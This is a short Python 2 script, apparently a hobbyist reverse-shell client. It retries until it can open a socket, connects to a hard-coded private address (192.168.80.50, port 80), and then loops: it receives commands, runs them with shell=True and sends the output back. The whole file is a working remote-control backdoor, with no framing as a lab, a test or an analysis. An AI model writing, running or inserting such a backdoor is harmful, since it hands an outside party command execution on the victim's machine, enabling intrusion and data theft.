import subprocess
import socket
import time
import os

j=1

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print "Socket create succesful!"
		break
	except:
			print "failed to create socket, trying again in: 5"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 4"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 3"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 2"
			time.sleep(1)
			os.system("cls")
			print "failed to create socket, trying again in: 1"
			time.sleep(1)
			os.system("cls")

while True:
	try:
		s.connect(('192.168.80.50', 80))
		print "Socket connection succesful!"
		break
	except:

		print "failed to connect socket! Try: " + str(j)
		time.sleep(1)
		j+=1



while True:
	
	data = s.recv(1024)
	proc = subprocess.Popen([data], stdout=subprocess.PIPE, shell=True)
	(out, err) = proc.communicate()
	s.sendall(out)

	
